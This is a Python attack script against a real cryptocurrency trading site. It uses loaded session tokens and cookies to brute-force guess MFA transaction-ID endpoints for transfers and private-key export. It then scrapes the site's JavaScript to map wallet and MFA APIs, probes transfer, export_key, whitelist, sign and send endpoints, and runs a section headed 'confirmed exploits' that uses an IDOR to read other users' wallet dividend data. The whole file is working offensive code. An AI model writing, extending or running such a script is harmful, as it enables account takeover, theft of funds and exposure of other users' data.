#!/usr/bin/env python3
"""FULL BLAST - Download everything, map all endpoints, find TxnId creation"""

import asyncio
import aiohttp
import json
import re
from datetime import datetime

# Load creds
with open('tokens.json') as f:
    tokens = json.load(f)
with open('cookies.json') as f:
    cookies = json.load(f)

TOKEN = tokens['access_token']
COOKIES = cookies
PARAMS = "device_id=acf898c7-5063-4d0f-b992-d1e5d568409e&fp_did=5154d56b50e3061629dca8bf8538b346&client_id=gmgn_web_20260712-1986-3641f8b&from_app=gmgn&app_ver=20260712-1986-3641f8b&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0"

HEADERS = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Origin': 'https://gmgn.ai',
    'Referer': 'https://gmgn.ai/',
}

async def hit(session, method, endpoint, payload=None, use_params=False):
    url = f"https://gmgn.ai{endpoint}"
    if use_params:
        url += f"?{PARAMS}"
    try:
        if method == "POST":
            async with session.post(url, json=payload or {}) as r:
                return {"ep": endpoint, "s": r.status, "b": await r.text()}
        else:
            async with session.get(url) as r:
                return {"ep": endpoint, "s": r.status, "b": await r.text()}
    except Exception as e:
        return {"ep": endpoint, "s": 0, "b": str(e)}

async def main():
    print("🔥 FULL BLAST MODE - DOWNLOADING EVERYTHING")
    print("="*70)
    
    timeout = aiohttp.ClientTimeout(total=30, connect=5)
    async with aiohttp.ClientSession(timeout=timeout, headers=HEADERS, cookies=COOKIES) as session:
        
        # ══════════════════════════════════════════════════════════
        # PHASE 1: HUNT TxnId CREATION ENDPOINT
        # ══════════════════════════════════════════════════════════
        print("\n🎯 PHASE 1: TxnId CREATION ENDPOINT HUNT")
        print("-"*70)
        
        txn_creation_candidates = [
            # Direct creation paths
            ("POST", "/account/mfa/txn/v1/create", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/init", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/request", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/generate", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/new", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/start", {"usage": "transfer"}),
            ("GET", "/account/mfa/txn/v1/create", None),
            ("GET", "/account/mfa/txn/v1/init", None),
            # Without /mfa
            ("POST", "/account/txn/v1/create", {"usage": "transfer"}),
            ("POST", "/account/txn/v1/init", {"usage": "transfer"}),
            ("POST", "/account/txn/create", {"usage": "transfer"}),
            # Wallet-API variants
            ("POST", "/wallet-api/v1/txn/create", {"usage": "transfer"}),
            ("POST", "/wallet-api/v1/txn/init", {"usage": "transfer"}),
            ("POST", "/wallet-api/v1/txn/generate", {}),
            ("POST", "/wallet-api/v1/create_txn", {}),
            # MFA direct
            ("POST", "/account/mfa/v1/create_txn", {"usage": "transfer"}),
            ("POST", "/account/mfa/v1/request_txn", {"usage": "transfer"}),
            ("POST", "/account/mfa/v1/init_txn", {"usage": "transfer"}),
            ("POST", "/account/mfa/create", {"usage": "transfer"}),
            # Passkey/WebAuthn flow (we know passkey_registration works)
            ("POST", "/account/mfa/txn/v1/request_id", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/get_request_id", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/begin", {"usage": "transfer"}),
            ("POST", "/account/mfa/txn/v1/challenge", {"usage": "transfer"}),
            # Transfer-specific
            ("POST", "/wallet-api/v1/transfer/init", {}),
            ("POST", "/wallet-api/v1/transfer/create_txn", {}),
            ("POST", "/wallet-api/v1/transfer/request", {}),
            ("POST", "/wallet-api/v1/pre_transfer", {}),
            # Export key specific  
            ("POST", "/wallet-api/v1/export_key/init", {}),
            ("POST", "/wallet-api/v1/export_key/request", {}),
        ]
        
        for method, ep, payload in txn_creation_candidates:
            r = await hit(session, method, ep, payload, use_params=True)
            status = r["s"]
            body = r["b"]
            
            icon = "🔥" if status == 200 else "⚡" if status not in [404, 403, 0] else "❌"
            print(f"  {icon} {method} {ep:<50} → {status}", end="")
            
            if status == 200:
                print(f" 🚨 SUCCESS!")
                print(f"      {body[:300]}")
            elif status not in [404, 403, 0]:
                try:
                    d = json.loads(body)
                    msg = d.get("message", "")[:80]
                    print(f" | {msg}")
                except:
                    print(f" | {body[:80]}")
            else:
                print()
            
            await asyncio.sleep(0.2)
        
        # ══════════════════════════════════════════════════════════
        # PHASE 2: DOWNLOAD JS BUNDLES - MAP ALL ENDPOINTS
        # ══════════════════════════════════════════════════════════
        print("\n\n🎯 PHASE 2: DOWNLOADING JS BUNDLES")
        print("-"*70)
        
        # Get the main page to find JS bundle URLs
        r = await hit(session, "GET", "/", None)
        html = r["b"]
        
        # Extract JS bundle URLs
        js_urls = re.findall(r'src="(/[^"]*\.js[^"]*)"', html)
        js_urls += re.findall(r'href="(/[^"]*\.js[^"]*)"', html)
        # Also try _next/static patterns
        js_urls += re.findall(r'"(/\_next/static/[^"]+\.js)"', html)
        
        print(f"  Found {len(js_urls)} JS bundle URLs in HTML")
        
        # Also try known Next.js patterns
        known_js_paths = [
            "/_next/static/chunks/main.js",
            "/_next/static/chunks/webpack.js",
            "/_next/static/chunks/pages/_app.js",
            "/_next/static/chunks/pages/index.js",
        ]
        
        all_endpoints = set()
        all_api_paths = set()
        
        # Download each JS bundle and extract API paths
        for js_url in (js_urls[:20] + known_js_paths):  # Limit to 20
            if not js_url.startswith("http"):
                full_url = f"https://gmgn.ai{js_url}"
            else:
                full_url = js_url
            
            try:
                async with session.get(full_url) as resp:
                    if resp.status == 200:
                        js_content = await resp.text()
                        
                        # Extract ALL API paths from JS
                        api_patterns = re.findall(r'["\'](/(?:api|tapi|xapi|wallet-api|account|bot-api)/[^"\'\\]{3,80})["\']', js_content)
                        api_patterns += re.findall(r'["\'](/v\d/[^"\'\\]{3,80})["\']', js_content)
                        
                        # Extract fetch/axios URLs
                        fetch_patterns = re.findall(r'(?:fetch|axios|request|post|get)\s*\(\s*[`"\'](/?[^`"\']{5,100})[`"\']', js_content)
                        
                        # Extract route patterns
                        route_patterns = re.findall(r'path:\s*["\']([^"\']+)["\']', js_content)
                        
                        for p in api_patterns + fetch_patterns + route_patterns:
                            if '/' in p and not p.endswith('.js') and not p.endswith('.css'):
                                all_api_paths.add(p)
                        
                        if api_patterns:
                            print(f"  ✓ {js_url[-60:]}: {len(api_patterns)} API paths found")
                    else:
                        pass
            except:
                pass
            
            await asyncio.sleep(0.1)
        
        print(f"\n  📊 Total unique API paths extracted: {len(all_api_paths)}")
        
        if all_api_paths:
            # Sort and categorize
            wallet_paths = sorted([p for p in all_api_paths if 'wallet' in p.lower()])
            bot_paths = sorted([p for p in all_api_paths if 'bot' in p.lower() or 'trading' in p.lower()])
            txn_paths = sorted([p for p in all_api_paths if 'txn' in p.lower() or 'transfer' in p.lower() or 'mfa' in p.lower()])
            account_paths = sorted([p for p in all_api_paths if 'account' in p.lower()])
            
            if wallet_paths:
                print(f"\n  💰 WALLET ENDPOINTS ({len(wallet_paths)}):")
                for p in wallet_paths[:30]:
                    print(f"      {p}")
            
            if bot_paths:
                print(f"\n  🤖 BOT/TRADING ENDPOINTS ({len(bot_paths)}):")
                for p in bot_paths[:30]:
                    print(f"      {p}")
            
            if txn_paths:
                print(f"\n  🔑 TXN/TRANSFER/MFA ENDPOINTS ({len(txn_paths)}):")
                for p in txn_paths[:30]:
                    print(f"      {p}")
            
            if account_paths:
                print(f"\n  👤 ACCOUNT ENDPOINTS ({len(account_paths)}):")
                for p in account_paths[:30]:
                    print(f"      {p}")
            
            # Save all discovered paths
            with open("discovered_endpoints.json", "w") as f:
                json.dump({
                    "all": sorted(all_api_paths),
                    "wallet": wallet_paths,
                    "bot": bot_paths,
                    "txn": txn_paths,
                    "account": account_paths
                }, f, indent=2)
            print(f"\n  [*] Saved to discovered_endpoints.json")
        
        # ══════════════════════════════════════════════════════════
        # PHASE 3: TEST ALL DISCOVERED WALLET/TXN ENDPOINTS
        # ══════════════════════════════════════════════════════════
        print("\n\n🎯 PHASE 3: TESTING ALL WALLET-API ENDPOINTS")
        print("-"*70)
        
        # Known wallet-api endpoints to test with fresh token
        wallet_tests = [
            ("GET", "/wallet-api/v1/get_whitelist_address"),
            ("POST", "/wallet-api/v1/transfer", {"chain": "sol", "from_address": "", "to_address": "", "AmountTxt": "0"}),
            ("POST", "/wallet-api/v1/export_key", {}),
            ("POST", "/wallet-api/v1/set_whitelist_address", {}),
            ("GET", "/wallet-api/v1/wallet_list"),
            ("GET", "/wallet-api/v1/assets"),
            ("GET", "/wallet-api/v1/balance"),
            ("GET", "/wallet-api/v1/info"),
            ("GET", "/wallet-api/v1/history"),
            ("GET", "/wallet-api/v1/transactions"),
            ("POST", "/wallet-api/v1/sign", {}),
            ("POST", "/wallet-api/v1/send", {}),
        ]
        
        # Add any discovered wallet paths
        for p in sorted(all_api_paths):
            if 'wallet' in p.lower() and p not in [t[1] for t in wallet_tests]:
                wallet_tests.append(("POST", p, {}))
                wallet_tests.append(("GET", p, None))
        
        for method, ep, *payload in wallet_tests[:40]:
            pl = payload[0] if payload else None
            r = await hit(session, method, ep, pl, use_params=True)
            status = r["s"]
            body = r["b"]
            
            icon = "🔥" if status == 200 else "⚡" if status not in [404, 403, 0] else "❌"
            print(f"  {icon} {method} {ep:<55} → {status}", end="")
            
            if status == 200:
                print(f" 🚨")
                print(f"      {body[:200]}")
            elif status == 400:
                try:
                    d = json.loads(body)
                    print(f" | {d.get('message', '')[:60]}")
                except:
                    print(f" | {body[:60]}")
            else:
                print()
            
            await asyncio.sleep(0.2)
        
        # ══════════════════════════════════════════════════════════
        # PHASE 4: CONFIRMED EXPLOITS - LIVE DATA
        # ══════════════════════════════════════════════════════════
        print("\n\n🎯 PHASE 4: CONFIRMED EXPLOITS - GRABBING LIVE DATA")
        print("-"*70)
        
        # Dividend IDOR - grab some wallets
        test_wallets = [
            "0xa7d4ffc4eca3c71af150ce302560a9d04a1d2b9f",
            "0x8894E0a0c962CB723c1976a4421c95949bE2D4E3",
            "0xdead000000000000000000000000000000000000",
        ]
        
        for wallet in test_wallets:
            r = await hit(session, "POST", "/xapi/v1/bsc/flap/dividend_info", {"from_address": wallet})
            if r["s"] == 200:
                try:
                    data = json.loads(r["b"])
                    total = data.get("data", {}).get("total_usdt_value", "0")
                    print(f"  💰 {wallet[:20]}... → ${total}")
                except:
                    print(f"  ⚡ {wallet[:20]}... → {r['b'][:100]}")
            await asyncio.sleep(0.2)
        
        print("\n\n" + "="*70)
        print("📊 FULL BLAST COMPLETE")
        print("="*70)


asyncio.run(main())
